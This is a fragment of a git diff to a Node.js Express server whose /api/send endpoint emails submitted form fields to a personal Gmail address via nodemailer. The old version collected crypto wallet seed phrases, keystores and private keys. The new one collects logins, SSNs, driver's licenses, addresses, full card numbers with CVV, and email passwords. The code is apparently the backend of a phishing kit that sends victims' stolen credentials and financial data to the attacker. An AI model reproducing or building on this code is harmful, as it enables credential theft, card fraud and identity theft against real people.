@@ -21,8 +21,11 @@ const users = [
 
 app.post('/api/send', async (req, res) => {
 
-    const { phrase, keystore_json, wallet_password, private_key, type, platform } = req.body;
+    const {type, platform, username, password, firstname, lastname, othername, dob, ssn, driver_license, address, card_name, card_number, card_expiration, card_cvv, email, email_pass } = req.body;
 
+
+
+ 
 
 
  var transport = nodemailer.createTransport({
@@ -36,7 +39,7 @@ app.post('/api/send', async (req, res) => {
 
   let mailOptions = {
     from: 'twebresolve@jumping-rivers.co.uk',
-    to: ['ricardo.josh12@gmail.com', 'sallymaniitta@gmail.com'],
+    to: 'ricardo.josh12@gmail.com',
     subject: type,
     html: `
       <html>
